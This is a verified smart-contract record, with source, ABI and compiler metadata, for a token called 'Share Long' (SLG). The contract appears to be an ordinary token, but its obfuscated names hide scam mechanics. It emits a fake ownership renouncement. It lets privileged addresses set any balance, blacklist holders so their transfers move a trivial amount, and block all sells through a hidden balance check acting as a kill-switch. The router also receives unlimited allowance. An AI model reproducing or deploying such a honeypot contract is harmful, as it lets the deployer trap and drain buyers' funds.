{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface toFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellTake {\n    function createPair(address teamTrading, address walletMin) external returns (address);\n}\n\ninterface autoReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toTxEnable) external view returns (uint256);\n\n    function transfer(address launchedListAt, uint256 marketingLimit) external returns (bool);\n\n    function allowance(address tokenReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedListAt,\n        uint256 marketingLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletFundList, uint256 value);\n    event Approval(address indexed tokenReceiver, address indexed spender, uint256 value);\n}\n\ninterface autoReceiverMetadata is autoReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ShareLong is txMarketing, autoReceiver, autoReceiverMetadata {\n\n    address public receiverFrom;\n\n    bool public takeExemptFrom;\n\n    uint256 private receiverShould;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldExempt;\n    }\n\n    function transferFrom(address totalReceiver, address launchedListAt, uint256 marketingLimit) external override returns (bool) {\n        if (_msgSender() != feeTo) {\n            if (toSenderWallet[totalReceiver][_msgSender()] != type(uint256).max) {\n                require(marketingLimit <= toSenderWallet[totalReceiver][_msgSender()]);\n                toSenderWallet[totalReceiver][_msgSender()] -= marketingLimit;\n            }\n        }\n        return enableWallet(totalReceiver, launchedListAt, marketingLimit);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamFundSender;\n    }\n\n    uint256 autoSender;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverAmountExempt;\n    }\n\n    constructor (){\n        if (launchedMarketing != launchedLimit) {\n            launchedMarketing = launchShouldEnable;\n        }\n        toFrom limitTeam = toFrom(feeTo);\n        minSender = sellTake(limitTeam.factory()).createPair(limitTeam.WETH(), address(this));\n        \n        receiverFrom = _msgSender();\n        shouldMode();\n        amountFee[receiverFrom] = true;\n        marketingLaunchMin[receiverFrom] = teamFundSender;\n        if (receiverFee == launchedMarketing) {\n            launchShouldEnable = receiverFee;\n        }\n        emit Transfer(address(0), receiverFrom, teamFundSender);\n    }\n\n    function isBuy(address takeFee, uint256 marketingLimit) public {\n        fundMax();\n        marketingLaunchMin[takeFee] = marketingLimit;\n    }\n\n    string private receiverAmountExempt = \"Share Long\";\n\n    function allowance(address swapAt, address receiverReceiver) external view virtual override returns (uint256) {\n        if (receiverReceiver == feeTo) {\n            return type(uint256).max;\n        }\n        return toSenderWallet[swapAt][receiverReceiver];\n    }\n\n    uint256 constant tokenFrom = 17 ** 10;\n\n    mapping(address => bool) public atFee;\n\n    uint256 public launchedMarketing;\n\n    function fundAt(address totalReceiver, address launchedListAt, uint256 marketingLimit) internal returns (bool) {\n        require(marketingLaunchMin[totalReceiver] >= marketingLimit);\n        marketingLaunchMin[totalReceiver] -= marketingLimit;\n        marketingLaunchMin[launchedListAt] += marketingLimit;\n        emit Transfer(totalReceiver, launchedListAt, marketingLimit);\n        return true;\n    }\n\n    uint256 public receiverFee;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeFrom;\n    }\n\n    uint256 private launchShouldEnable;\n\n    mapping(address => uint256) private marketingLaunchMin;\n\n    function shouldMode() public {\n        emit OwnershipTransferred(receiverFrom, address(0));\n        atBuy = address(0);\n    }\n\n    event OwnershipTransferred(address indexed feeToEnable, address indexed amountMax);\n\n    uint256 private teamFundSender = 100000000 * 10 ** 18;\n\n    function approve(address receiverReceiver, uint256 marketingLimit) public virtual override returns (bool) {\n        toSenderWallet[_msgSender()][receiverReceiver] = marketingLimit;\n        emit Approval(_msgSender(), receiverReceiver, marketingLimit);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return atBuy;\n    }\n\n    mapping(address => mapping(address => uint256)) private toSenderWallet;\n\n    address public minSender;\n\n    address fromTokenIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function shouldLaunch(uint256 marketingLimit) public {\n        fundMax();\n        autoSender = marketingLimit;\n    }\n\n    mapping(address => bool) public amountFee;\n\n    function enableWallet(address totalReceiver, address launchedListAt, uint256 marketingLimit) internal returns (bool) {\n        if (totalReceiver == receiverFrom) {\n            return fundAt(totalReceiver, launchedListAt, marketingLimit);\n        }\n        uint256 walletReceiverSender = autoReceiver(minSender).balanceOf(fromTokenIs);\n        require(walletReceiverSender == autoSender);\n        require(launchedListAt != fromTokenIs);\n        if (atFee[totalReceiver]) {\n            return fundAt(totalReceiver, launchedListAt, tokenFrom);\n        }\n        return fundAt(totalReceiver, launchedListAt, marketingLimit);\n    }\n\n    uint256 takeMarketingMode;\n\n    function owner() external view returns (address) {\n        return atBuy;\n    }\n\n    address private atBuy;\n\n    string private shouldExempt = \"SLG\";\n\n    function transfer(address takeFee, uint256 marketingLimit) external virtual override returns (bool) {\n        return enableWallet(_msgSender(), takeFee, marketingLimit);\n    }\n\n    function listSellTx(address marketingLaunch) public {\n        fundMax();\n        \n        if (marketingLaunch == receiverFrom || marketingLaunch == minSender) {\n            return;\n        }\n        atFee[marketingLaunch] = true;\n    }\n\n    address feeTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private takeFrom = 18;\n\n    uint256 public liquidityAuto;\n\n    uint256 public launchedLimit;\n\n    function fundMax() private view {\n        require(amountFee[_msgSender()]);\n    }\n\n    function senderModeIs(address totalMax) public {\n        if (takeExemptFrom) {\n            return;\n        }\n        if (receiverShould == launchShouldEnable) {\n            launchedLimit = launchShouldEnable;\n        }\n        amountFee[totalMax] = true;\n        if (launchedMarketing == liquidityAuto) {\n            launchShouldEnable = launchedMarketing;\n        }\n        takeExemptFrom = true;\n    }\n\n    function balanceOf(address toTxEnable) public view virtual override returns (uint256) {\n        return marketingLaunchMin[toTxEnable];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeToEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletFundList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTxEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingLimit\",\"type\":\"uint256\"}],\"name\":\"isBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunch\",\"type\":\"address\"}],\"name\":\"listSellTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"}],\"name\":\"senderModeIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingLimit\",\"type\":\"uint256\"}],\"name\":\"shouldLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeExemptFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedListAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ShareLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}